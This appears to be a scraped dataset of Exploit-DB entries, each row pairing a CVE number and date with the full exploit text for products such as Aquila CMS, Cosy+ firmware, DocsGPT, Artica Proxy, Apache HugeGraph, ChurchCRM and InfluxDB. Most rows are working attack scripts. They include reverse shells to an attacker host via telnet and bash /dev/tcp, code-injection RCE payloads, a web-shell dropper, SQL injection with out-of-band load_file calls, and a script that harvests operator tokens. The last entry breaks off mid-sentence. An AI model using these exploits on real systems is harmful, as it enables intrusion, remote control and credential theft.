{plugin_id}"") break if plugin_id is None: print(""[-] Plugin not found"") return print(""[+] Deactivate plugin"") headers = {""Authorization"": auth_token} data = {""idModule"": plugin_id, ""active"": False} res = requests.post(f""{args.url}/api/v2/modules/toggle"", headers=headers, json=data) if res.status_code == 200: print(""[+] Command execution succeeded"") else: print(""[-] Command execution failed"") def main(): print(""[*] Retrieve email addresses"") emails = get_user_emails() print(""\n[*] Reset password"") for email in emails: reset_password(email) print(""\n[*] Perform remote code execution"") rce(emails) if __name__ == ""__main__"": parser = argparse.ArgumentParser() parser.add_argument( ""-u"", dest=""url"", help=""Site URL (e.g. www.aquila-cms.com)"", type=str, required=True, parser.add_argument( ""-p"", dest=""password"", help=""Password to use for password reset (e.g. HaXX0r3d!)"", type=str, default=""HaXX0r3d!"", parser.add_argument( ""-c"", dest=""command"", help=""Command to execute (e.g. touch /tmp/pwned)"", type=str, default=""touch /tmp/pwned"", args = parser.parse_args() main()"
CVE-2019-10652,2025-04-10,exploit db,# Exploit Title: flatCore 1.5.5 - Arbitrary File Upload # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/flatCore/flatCore-CMS # Software Link: https://github.com/flatCore/flatCore-CMS # Version: 1.5.5 # Tested on: Ubuntu Windows # CVE : CVE-2019-10652
CVE-2024-33896,2025-04-10,exploit db,"# Exploit Title: Cosy+ firmware 21.2s7 - Command Injection # Google Dork: N/A # Date: 2024-8-20 # Exploit Author: CodeB0ss # Contact: t.me/codeb0ss / uncodeboss@gmail.com # Version: 21.2s7 # Tested on: Windows 11 Home Edition # CVE: CVE-2024-33896 import socket import subprocess import time def configcreator(file_path): with open(file_path, 'w') as f: f.write( """""" client dev tun persist-tun proto tcp verb 5 mute 20 --up '/bin/sh -c ""TF=$(mktemp -u);mkfifo $TF;telnet {attacker_ip} 5000 0<$TF | sh 1>$TF""' script-security 2 """""") def l3st(port): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.bind(('0.0.0.0', port)) server_socket.listen(1) print(f"" - --> Listening_0n_port {port}"") client_socket, _ = server_socket.accept() print("" - --> Recevied"") while True: data = client_socket.recv(1024) if not data: break print(data.decode()) client_socket.close() server_socket.close() if name == ""main"": IP = '127.0.0.1' config = '/path/to/malicious_config.ovpn' port = 5000 listener_process = subprocess.Popen(['python', '-c', f'from main import start_listener; start_listener({port})']) time.sleep(2) create_malicious_openvpn_config(config) print(f"" - --> config_created {config}"") GitHub: https://github.com/codeb0ss/CVE-2024-33896-"
CVE-2025-0868,2025-04-09,exploit db,"# Exploit Title: DocsGPT 0.12.0 - Remote Code Execution # Date: 09/04/2025 # Exploit Author: Shreyas Malhotra (OSMSEC) # Vendor Homepage: https://github.com/arc53/docsgpt # Software Link: https://github.com/arc53/DocsGPT/archive/refs/tags/0.12.0.zip # Version: 0.8.1 through 0.12.0 # Tested on: Debian Linux/Ubuntu Linux/Kali Linux # CVE: CVE-2025-0868 import requests # TARGET CONFIG TARGET = ""http://10.0.2.15:7091"" # Change this # Malicious payload string - carefully escaped - modify the python code if necessary malicious_data = ( 'user=1&source=reddit&name=other&data={""source"":""reddit"",' '""client_id"":""1111"",""client_secret"":1111,""user_agent"":""111"",' '""search_queries"":[""""],""number_posts"":10,' '""rce\\\\"":__import__(\'os\').system(\'touch /tmp/test\')}#"":11}' headers = { ""Content-Type"": ""application/x-www-form-urlencoded"" try: response = requests.post(f""{TARGET}/api/remote"", headers=headers, data=malicious_data) print(f""[+] Status Code: {response.status_code}"") print(""[+] Response Body:"") print(response.text) except Exception as e: print(f""[-] Error sending request: {e}"")"
CVE-2024-2054,2025-04-09,exploit db,"# Exploit Title: Artica Proxy 4.50 - Remote Code Execution (RCE) # Date: 23-04-2024 # Exploit Author: Madan # Vendor Homepage: https://artica-proxy.com/ # Version: 4.40, 4.50 # Tested on: [relevant os] # CVE : CVE-2024-2054 you can also find the exploit on my github repo: https://github.com/Madan301/CVE-2024-2054 import requests import base64 import urllib3 from colorama import Fore print(""Url format Ex: https://8x.3x.xx.xx:9000 the port 9000 might sometimes vary from how artica proxy interface is hosted"") URL = input(""Enter url: "") if URL[-1]==""/"": ACTUAL_URL = URL[:-1] else: ACTUAL_URL = URL ARTICA_URL = ACTUAL_URL def check(ARTICA_URL): urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) try: check = requests.get(ARTICA_URL+'/wizard/wiz.upload.php',verify=False) except Exception as e: print(Fore.RED+""Could not reach, check URL"") if check.status_code==200: print(Fore.GREEN+""Vulnerable"") return True else: print(Fore.RED+""Not Vulnerable"") def exploit(ARTICA_URL): payload = base64.b64encode(b"" "").decode() payload_data = { ""TzoxOToiTmV0X0ROUzJfQ2FjaGVfRmlsZSI"": { ""cache_file"": ""/usr/share/artica-postfix/wizard/wiz.upload.php"", ""cache_serializer"": ""json"", ""cache_size"": 999999999, ""cache_data"": { payload: { ""cache_date"": 0, ""ttl"": 999999999 while True: PAYLOAD_CMD = input(""enter command: "") url = f""{ARTICA_URL}/wizard/wiz.wizard.progress.php?build-js={payload_data}"" urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url, verify=False) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) if response.status_code == 200: cmd_url = f""{ARTICA_URL}/wizard/wiz.upload.php?cmd={PAYLOAD_CMD}"" cmd_response = requests.get(cmd_url, verify=False) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) print(cmd_response.text) else: print(""Failed to execute the payload"") check = check(ARTICA_URL=ACTUAL_URL) if check==True: exploit(ARTICA_URL=ARTICA_URL)"
CVE-2024-37732,2025-04-09,exploit db,"# Exploit Title: Anchor CMS 0.12.7 - Stored Cross Site Scripting (XSS) # Date: 04/28/2024 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://anchorcms.com/ # Software Link: https://github.com/anchorcms/anchor-cms/archive/refs/tags/0.12.7.zip # Version: latest # Tested on: MacOS # Log in to Anchor CMS. # Click on ""Create New Post"". # Fill in the ""Title"" and enter the following payload in the field immediately below: # ""> # Go to the homepage, and you will see the alert!"
CVE-2024-24409,2025-04-09,exploit db,"# Exploit Title: ManageEngine ADManager Plus Build < 7210 Elevation of Privilege Vulnerability # Exploit Author: Metin Yunus Kandemir # Vendor Homepage: https://www.manageengine.com/ # Software Link: https://www.manageengine.com/products/ad-manager/ # Details: https://docs.unsafe-inline.com/0day/admanager-plus-build-less-than-7210-elevation-of-privilege-vulnerability-cve-2024-24409 # Version: ADManager Plus Build < 7210 # Tested against: Build 7203 # CVE: CVE-2024-24409 # Description The Modify Computers is a predefined role in ADManager for managing computers. If a technician user has the Modify Computers privilege over a computer can change the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer object. In this way, the technician user can set Constrained Kerberos Delegation over any computer within the Organizational Unit that the user was delegated. Contrary to what ADManager claims the user who has the Modify Computers role can change the privilege of computer objects in the Active Directory. The Constrained Kerberos Delegation can be set for any service such as CIFS, LDAP, HOST services. Then the user can access these services by abusing the Constrained Kerberos Delegation. In addition, the Unconstrained Kerberos Delegation can be set over the computer objects by changing the userAccountControl attribute. Normally, only users that have SeEnableDelegationPrivilege privilege can set constrained kerberos delegation. Only members of the BUILTIN\Administrators group have this privilege by default. The delegated user for an Organizational Unit can not set constrained kerberos delegation even if a user has the GenericAll right over a computer account, so the delegation process in Active Directory does not grant this privilege. However, the technician user can use the SeEnableDelegationPrivilege right via the Modify Computers role. # Vulnerability reasons 1. ADMP Web App Authorization issue: Assigning a predefined Modify Computers role delegates the technician user to modify custom attributes of computers unexpectedly. Even though it appears that this privilege is not granted in the UI, the Additional Custom Attribute property is assigned and this leads to broken access control vulnerability. 2. There is no restriction for editing the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer objects. The ADMP application performs changes with domain admin privileges as designed so that if we can bypass some restrictions (e.g. format of attribute value), our requests are applied with domain admin privileges. This way we can edit the attributes userAccountControl and msDS-AllowedToDelegateTo. # Impact A technician user elevates privileges from Domain User to Domain Admin. For example, the user can set Constrained Kerberos Delegation over CLIENT1$ for the CIFS service of the domain controller and access the CIFS service. As a result, the user is delegated to manage CLIENT1$ but he can access the CIFS service of the domain controller impersonating a user unexpectedly. # Proof Of Concept https://docs.unsafe-inline.com/0day/admanager-plus-build-less-than-7210-elevation-of-privilege-vulnerability-cve-2024-24409"
CVE-2024-27348,2025-04-09,exploit db,"# Exploit Title: Apache HugeGraph Server 1.2.0 - Remote Code Execution (RCE) # Exploit Author: Yesith Alvarez # Vendor Homepage: https://hugegraph.apache.org/docs/download/download/ # Version: Apache HugeGraph 1.0.0 - 1.2.0 # CVE : CVE-2024–27348 from requests import Request, Session import sys import json def title(): print(''' | |___ \ V / | |__|_____/ __/| |_| / __/|__ _|_____/ __/ / / ___) |__ _| (_) | [+] Reverse shell Author: Yesith Alvarez Github: https://github.com/yealvarez Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/ Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2024–27348/exploit.py def exploit(url, lhost, lport): payload = {""gremlin"": ""Thread thread = Thread.currentThread();Class clz = Class.forName(\""java.lang.Thread\"");java.lang.reflect.Field field = clz.getDeclaredField(\""name\"");field.setAccessible(true);field.set(thread, \""VICARIUS\"");Class processBuilderClass = Class.forName(\""java.lang.ProcessBuilder\"");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\""bash\"", \""-c\"", \""bash -i>&/dev/tcp/""+lhost+""/""+lport+""\"", \""0>&1\"");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\""start\"");startMethod.invoke(processBuilderInstance);"", ""bindings"": {}, ""language"": ""gremlin-groovy"", ""aliases"": {}} headers = { 'Content-Type': 'application/json'} s = Session() url = url + ""/gremlin"" req = Request('POST', url, json=payload, headers=headers) prepped = req.prepare() del prepped.headers['Content-Type'] resp = s.send(prepped, verify=False, timeout=15) print(prepped.headers) print(url) print(resp.headers) print(payload) print(resp.status_code) print(resp.text) if __name__ == '__main__': title() if(len(sys.argv) < 4): print('[+] USAGE: python3 %s https:// lhost lport \n'%(sys.argv[0])) print('[+] USAGE: python3 %s https://192.168.0.10 192.168.0.2 4444\n'%(sys.argv[0])) print('[+] Do not forget to run the listener: nc -lvp 4444\n') exit(0) else: exploit(sys.argv[1],sys.argv[2],sys.argv[3])"
CVE-2024-39143,2025-04-09,exploit db,"# Exploit Title: ResidenceCMS 2.10.1 - Stored Cross-Site Scripting (XSS) # Date: 8-7-2024 # Category: Web Application # Exploit Author: Jeremia Geraldi Sihombing # Version: 2.10.1 # Tested on: Windows # CVE: CVE-2024-39143 Description: A stored cross-site scripting (XSS) vulnerability exists in ResidenceCMS 2.10.1 that allows a low-privilege user to create malicious property content with HTML inside it, which acts as a stored XSS payload. If this property page is visited by anyone including the administrator, then the XSS payload will be triggered.. Steps to reproduce 1. Login as a low privilege user with property edit capability. 2. Create or Edit one of the user owned property (We can user the default property owned by the user). 3. Fill the content form with XSS payload using the Code View feature. Before saving it make sure to go back using the usual view to see if the HTML is rendered or not. Vulnerable parameter name: property[property_description][content] Example Payload: 4. After saving the new property content and clicking the 'Finish Editing', go to the page and see the XSS is triggered. It is possible to trigger the XSS by using any account or even unauthorized account. Burp Request POST /en/user/property/7/edit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 1111 Origin: http://localhost Connection: keep-alive Referer: http://localhost/en/user/property/7/edit Cookie: REMEMBERME=App.Entity.User:dXNlcg~~:1722991344:s-spusttpMsLQb2wlzMc2GJcKATcKhGTfj1VuV8GOFA~dRl86I12JAEzbjfmLzxK4ps0tMcX9WH15-DfzD115EE~; PHPSESSID=fhp06bc4sc5i8p4fk5bt9petii; sidebar-toggled=false Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=1 property[city]=3&property[district]=&property[neighborhood]=3&property[metro_station]=&property[dealType]=1&property[category]=1&property[bathrooms_number]=&property[bedrooms_number]=2&property[max_guests]=6&property[property_description][title]=Furnished renovated 2-bedroom 2-bathroom flat&property[property_description][meta_title]=&property[property_description][meta_description]=Furnished renovated 2-bedroom 2-bathroom flat&property[address]=5411 Bayshore Blvd, Tampa, FL 33611&property[latitude]=27.885095&property[longitude]=-82.486153&property[show_map]=1&property[price]=2200&property[price_type]=mo&property[features][]=1&property[features][]=2&property[features][]=4&property[features][]=6&property[features][]=8&property[property_description][content]= &files=&property[_token]=09e8a0ac823.ahexkItiSa6gSwce8RFyNpn94Uqu9g1cc4CN6g-zLsE.PSHrpu87DJzVcjJ1smI1c8-VrjjGuHUGMefsg3XWdJcuL9_F2Cc_ncMsSg"
CVE-2024-38944,2025-04-09,exploit db,"# Exploit Title: Intelight X-1L Traffic controller Maxtime 1.9.6 - Remote Code Execution (RCE) # Google Dork: N/A # Date: 07/09/2024 # Exploit Author: Andrew Lemon/Red Threat https://redthreatsec.com # Vendor Homepage: https://www.q-free.com # Software Link: N/A # Version: 1.9 # Tested on: (Intelight x-1) Linux 3.14.57 # CVE : CVE-2024-38944 ## Vulnerability Description This vulnerability allows remote attackers to bypass authentication on affected installations of MaxTime Database Editor. Authentication is not required to exploit this vulnerability. The specific flaw exists within the web-based UI on Traffic Controllers running version 1.9.x firmware. The issue results from the lack of authentication prior to allowing access to functionality. An attacker can leverage this vulnerability to gain full control of Intelight Traffic Controllers and modify the configuration of a traffic intersection, modify traffic light sequences, or trigger the intersection to go into 4 way flash causing a denial of service and causing traffic congestion. ## Steps to Reproduce Navigate to the IP address of an identified controller When prompted for authentication append /cgi-bin/generateForm.cgi?formID=142 to the end of the IP address Under the web security tab change the drop down from enabled to disabled and select apply or take note of the username and password and login with those."
CVE-2024-39304,2025-04-09,exploit db,"# Exploit Title: ChurchCRM 5.9.1 - SQL Injection # Author: Sanan Qasimzada # Date: 06.07.2024 # Vendor: http://churchcrm.io/ # Software: https://github.com/ChurchRM/CRM # Reference: https://portswigger.net/web-security/sql-injection # Description: In the manual insertion point 1 - parameter `EID` appears to be vulnerable to SQL injection attacks. No need for cookies, no need admin authentication and etc. The attacker easily can steal information from this system by using this vulnerability. STATUS: HIGH Vulnerability - CRITICAL [+]Payload: ```mysql Parameter: EID (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: EID=(select load_file('\\\\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) OR NOT 2407=2407 Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: EID=(select load_file('\\\\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) AND (SELECT 9547 FROM (SELECT(SLEEP(3)))QEvX) Type: UNION query Title: MySQL UNION query (UTF8) - 11 columns Payload: EID=(select load_file('\\\\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) UNION ALL SELECT 'UTF8','UTF8',CONCAT(0x716a6b7a71,0x57646e6842556a56796a75716b504b4d6941786f7578696a4c557449796d76425645505670694b42,0x717a7a7871),'UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8'# # Reproduce: [href]( https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/ChurchCRM/2023/ChurchCRM-4.5.3-121fcc1 # Proof and Exploit: [href](https://streamable.com/1eqhw2) # Time spend: 01:00:00 System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/https://cve.mitre.org/index.html and https://www.exploit-db.com/ home page: https://www.nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ 0day Exploit DataBase https://0day.today/ home page: https://www.nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty"
CVE-2024-6244,2025-04-09,exploit db,"# Exploit Title: PZ Frontend Manager WordPress Plugin 1.0.5 - Cross Site Request Forgery (CSRF) # Date: 2024-07-01 # Exploit Author: Vuln Seeker Cybersecurity Team # Vendor Homepage: https://wordpress.org/plugins/pz-frontend-manager/ # Version: <= 1.0.5 # Tested on: Firefox # Contact me: vulns@vulnseeker.org The plugin does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks. Proof of concept: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost:10003 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1093 Origin: http://localhost:10003 Sec-GPC: 1 Connection: close Cookie: Cookie action=pzfm_upload_avatar&imageData=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx%2FBy7bYvtl4Y8Qn%2BtEjty6WxuQ0KkfOM5wJEeEkT1bsigU%2BxGQV%2BQfZ2ned0LAkLnyQ4XV2XB%2Fk%2BjXdTs8Mc1%2BUlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO%2BqN1sFvJm%2BIScB7s3uo8ZVzC8RrsXjIuqp2n0d%2BsxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0%2B6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5%2FBKh8H%2F3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs%2FEBXgoZ6Jf2KMNMYz4FgBJjTGkxR%2FH67vm%2FH8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle%2FP%2FMPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO%2Byev2NVDtZLeX5rvD9lu0zauxW%2Ba6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF%2BxW%2BYcT47Jkdzi4TpT%2BlPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg%3D%3D&userID=1 CSRF Exploit: Profile picture of user 1 will be changed in the dashboard http://localhost:10003/dashboard/?dashboard=profile Reference: https://wpscan.com/vulnerability/73ba55a5-6cff-40fc-9686-30c50f060732/"
CVE-2024-30896,2025-04-08,exploit db,"# Exploit Title: InfluxDB OSS Operator Privilege Escalation via BusinessLogic Flaw # Date: 22/03/2024 # Exploit Author: Andrea Pasin (Xenom0rph97) # Researcher Homepage: https://xenom0rph97.github.io/xeno/ # GitHub Exploit repo: https://github.com/XenoM0rph97/CVE-2024-30896 # Software Link: https://www.influxdata.com/products/influxdb/ # Version: 2.x <=> 2.7.11 # Tested on: InfluxDB OSS 2.x # CVE: CVE-2024-30896 # CVSS Base Score: 9.1 # CVSS v3.1 Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H # CVE-2024-30896 ## Summary A business logic flaw in influxdb allows users who own a valid allAccess token to escalate their privileges at operator level by listing current authorization tokens. ## Scenario Attacker might be a user which was gained access by an administrator via an allAccess token only within their organization. This user's permissions will allow full control over the organization but will still prevent him to interact with other orgs. ## Impact This vulnerability would allow a user to obtain unrestricted access to the influxdb instance. A similar condition might fully compromise Confidentiality, Integrity and Availability of data owned by users of different organizations. Additionally, since operator token has administrative permissions, Availability and Integrity of the entire influxdb instance might be compromised. ## Prerequisites/Limitations 1. Attacker must have a valid allAccess token 2. allAccess token must have been created in the same Org where an operator token resides (ex. same Org as Admin user) 3. Attacker must be able to interact with influxdb instance via CLI or APIs (influxClient) ## Steps to Reproduce ### Case 1: Exploitation via influxdb APIs: *Python Version*: 3 *Requirements*: `influxdb_client==1.41.0` *Script usage* % python3 ./CVE-2024-30896.py -h usage: CVE-2024-30896.py [-h] [-t TOKEN] [-e ENDPOINTURL] [-v [VERBOSE]] [-vv [VVERBOSE]] optional arguments: -h, --help show this help message and exit -t TOKEN, --token TOKEN Custom or allAccess token to access influx DB instance -e ENDPOINTURL, --endpointUrl ENDPOINTURL Endpoint Url of influxdb instance (ex. "" https://myInfluxdbInstance:8086/"") -v [VERBOSE], --verbose [VERBOSE] Enable verbose logging - INFO -vv [VVERBOSE], --vverbose [VVERBOSE] Enable verbose logging - DEBUG ### Case 2: Exploitation via influx CLI 1. Execute: `influx auth ls -t | grep write:/orgs`. This will list all current active operator tokens on the influxdb instance. *Example* # Using an allAccess token influx auth ls -t U1OuqmFC{REDACTED} | grep U1OuqmFC{REDACTED} 0cc41c3b050e5000 U1OuqmFC{REDACTED} admin 0cb9c92ee228b000 [read:orgs/87d0746948a3b3f5/authorizations write:orgs/87d0746948a3b3f5/authorizations read:orgs/87d0746948a3b3f5/buckets write:orgs/87d0746948a3b3f5/buckets read:orgs/87d0746948a3b3f5/dashboards write:orgs/87d0746948a3b3f5/dashboards read:/orgs/87d0746948a3b3f5 read:orgs/87d0746948a3b3f5/sources write:orgs/87d0746948a3b3f5/sources read:orgs/87d0746948a3b3f5/tasks write:orgs/87d0746948a3b3f5/tasks read:orgs/87d0746948a3b3f5/telegrafs write:orgs/87d0746948a3b3f5/telegrafs read:/users/0cb9c92ee228b000 write:/users/0cb9c92ee228b000 read:orgs/87d0746948a3b3f5/variables write:orgs/87d0746948a3b3f5/variables read:orgs/87d0746948a3b3f5/scrapers write:orgs/87d0746948a3b3f5/scrapers read:orgs/87d0746948a3b3f5/secrets write:orgs/87d0746948a3b3f5/secrets read:orgs/87d0746948a3b3f5/labels write:orgs/87d0746948a3b3f5/labels read:orgs/87d0746948a3b3f5/views write:orgs/87d0746948a3b3f5/views read:orgs/87d0746948a3b3f5/documents write:orgs/87d0746948a3b3f5/documents read:orgs/87d0746948a3b3f5/notificationRules write:orgs/87d0746948a3b3f5/notificationRules read:orgs/87d0746948a3b3f5/notificationEndpoints write:orgs/87d0746948a3b3f5/notificationEndpoints read:orgs/87d0746948a3b3f5/checks write:orgs/87d0746948a3b3f5/checks read:orgs/87d0746948a3b3f5/dbrp write:orgs/87d0746948a3b3f5/dbrp read:orgs/87d0746948a3b3f5/notebooks write:orgs/87d0746948a3b3f5/notebooks read:orgs/87d0746948a3b3f5/annotations write:orgs/87d0746948a3b3f5/annotations read:orgs/87d0746948a3b3f5/remotes write:orgs/87d0746948a3b3f5/remotes read:orgs/87d0746948a3b3f5/replications write:orgs/87d0746948a3b3f5/replications] # Listing all available tokens passing allAccess token and retrieving only operator level tokens influx auth ls -t U1OuqmFC{REDACTED} | grep write:/orgs 0cbb920e128e5000 gerKYLO0Ph_ibUk0y{REDACTED} admin 0cb9c92ee228b000 [read:/authorizations write:/authorizations read:/buckets write:/buckets read:/dashboards write:/dashboards read:/orgs write:/orgs read:/sources write:/sources read:/tasks write:/tasks read:/telegrafs write:/telegrafs read:/users write:/users read:/variables write:/variables read:/scrapers write:/scrapers read:/secrets write:/secrets read:/labels write:/labels read:/views write:/views read:/documents write:/documents read:/notificationRules write:/notificationRules read:/notificationEndpoints write:/notificationEndpoints read:/checks write:/checks read:/dbrp write:/dbrp read:/notebooks write:/notebooks read:/annotations write:/annotations read:/remotes write:/remotes read:/replications write:/replications] influxdb_client==1.41.0 import influxdb_client import argparse import logging import sys argParser = argparse.ArgumentParser() argParser.add_argument(""-t"", ""--token"", type=str, help=""Custom or allAccess token to access influx DB instance"") argParser.add_argument(""-e"", ""--endpointUrl"", type=str, help=""Endpoint Url of influxdb instance (ex. \""https://myInfluxdbInstance:8086/\"")"") argParser.add_argument(""-v"", ""--verbose"", type=bool, const=True, nargs='?', help=""Enable verbose logging - INFO"") argParser.add_argument(""-vv"", ""--vverbose"", type=bool, const=True, nargs='?', help=""Enable verbose logging - DEBUG"") args = argParser.parse_args() # Using user retrieved values or default (hardcoded) ones all_access_token = "" "" influx_endpoint_url = "" "" # Defining some colors red = ""\033[31m"" yellow = ""\033[93m"" purple = ""\33[1;95m"" green = ""\033[0;92m"" cyan = ""\033[96m"" bold =""\033[1m"" endc = ""\033[39m"" if args.vverbose == True: logging.basicConfig(level=logging.DEBUG) elif args.verbose == True: logging.basicConfig(level=logging.INFO) logger = logging.getLogger() if args.token: token = args.token else: logger.debug(f""{yellow}User did not set a token, using default one{endc}"") token = all_access_token if args.endpointUrl: endpointUrl = args.endpointUrl else: logger.debug(f""{yellow}User did not set an endpoint Url for influxdb, using default one{endc}"") endpointUrl = influx_endpoint_url logger.info(f""{cyan}Connecting to influx DB instance{endc}"") # Connecting to influxdb instance try: conn = influxdb_client.InfluxDBClient( url=endpointUrl, token=token, debug=False, verify_ssl=True # Verify InfluxDB connection health = conn.ping() if not health: logger.error(f""{red}Unable to connect to db instace "" + endpointUrl + f""{endc}"") print(f""{red}Quitting execution...{endc}"") sys.exit(1) except Exception as e: logger.error(f""{red}Failed to connect to db instance: "" + endpointUrl + "" Error: "" + str(e) + f""{endc}"") print(f""{red}Quitting execution...{endc}"") sys.exit(1) # Retrieving all current auths logger.debug(f""{yellow}Retrieving all auth tokens{endc}"") print(f""{cyan}Enumerating current authorizations...{endc}"") try: auths = conn.authorizations_api().find_authorizations() except Exception as e: logger.error(f""{red}Unable to retrieve authorizations. ERR: "" + str(e) +f""{endc}"") print(f""{red}Unable to retrieve authorizations. Quitting...{endc}"") sys.exit(1) if not auths: print(f""{cyan}No Authorization tokens found on the instance{endc}"") sys.exit(1) print(f""{cyan}{str(len(auths))} tokens found on the instance{endc}\n"") # Extracting operator token -> Parsing permissions to look for (""org = None"" and ""authType = write/auths""), not 100% efficiency -> TO OPTIMIZE logger.debug(f""{yellow}Parsing auth permissions to retrieve operator tokens{endc}"") print(f""{cyan}Enumerating all operator tokens:{endc}"") op_tokens = [] # In order to understand if a token is of type ""operator"" we need to enumerate all permissions and look for ""write/auths"" on org 'None' -> Unrescticted access try: for auth in auths: if auth.permissions: for perm in auth.permissions: if perm.action == ""write"" and perm.resource.org == None and perm.resource.type == ""authorizations"": op_tokens.append(auth.token) except Exception as e: logger.error(f""{red}Unable to parse permissions on found authorizations. ERR: "" + str(e) + f""{endc}"") print(f""{red}Unable to parse permissions on found authorizations. Quitting execution...{endc}"") sys.exit(1) logger.info(f""{cyan}Printing all operator auth tokens{endc}"") print(f""{cyan}{str(len(op_tokens))} operator tokens found.\n\nListing all operator tokens:\n{endc}"") for op_t in op_tokens: print(f""{green}{op_t}{endc}"")"
CVE-2024-23922,2025-04-08,exploit db,"# Exploit Title: Sony XAV-AX5500 Firmware Update Validation Remote Code Execution # Date: 11-Feb-2025 # Exploit Author: lkushinada # Vendor Homepage: https://www.sony.com/et/electronics/in-car-receivers-players/xav-ax5500 # Software Link: https://archive.org/details/xav-ax-5500-v-113 # Version: 1.13 # Tested on: Sony XAV-AX5500 # CVE : CVE-2024-23922 # From NIST CVE Details: # This vulnerability allows physically present attackers to execute arbitrary code on affected # installations of Sony XAV-AX5500 devices. Authentication is not required to exploit this # vulnerability. The specific flaw exists within the handling of software updates. The issue # results from the lack of proper validation of software update packages. An attacker can leverage # this vulnerability to execute code in the context of the device. # Was ZDI-CAN-22939 # # Summary # Sony's firmware validation for a number of their XAV-AX products relies on symetric cryptography, # obscurity of their package format, and a weird checksum method instead of any real firmware # signing mechanism. As such, this can be exploited to craft updates which bypass firmware validation # and allow a USB-based attacker to obtain RCE on the infotainment unit. # What's not mentioned in the CVE advisories, is that this method works on the majority of Sony's # infotainment units and products which use a similar chipset or firmware package format. Tested # to work on most firmware versions prior to v2.00. # # Threat Model # An attacker with physical access to an automotive media unit can typically utilize other methods # to achieve a malicious outcome. The reason to investigate the firmware to the extent in this post # is academic, exploratory, and cautionary, i.e. what other systems are protected in a similar # manner? if they are, how trivial is it to bypass? # # Disclaimer # The information in this article is for educational purposes only. # Tampering with an automotive system comes with risks which, if you don't understand, you should # not be undertaking. # THE AUTHORS DISCLAIM ANY AND ALL RESPONSIBILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES ARISING # FROM THE USE OF ANYTHING IN THIS DOCUMENT. # # The Unit # ## Processors # - DAC # - System Management Controller (SMC) # - Applications Processor # - Display Processor # Coming from a mobile and desktop computer environment, one may be use to thinking about # the Applications Processor as the most powerful chip in the system in terms of processing power, # size, power consumption, and system hierarchy. The first oddity of this platform is that the # application processor is not the most powerful; that honor goes to the DAC, a beefy ARM chip on the # board. # The application processor does not appear to be the orchestrator of the components on the system. # The SMC tkes which takes the role of 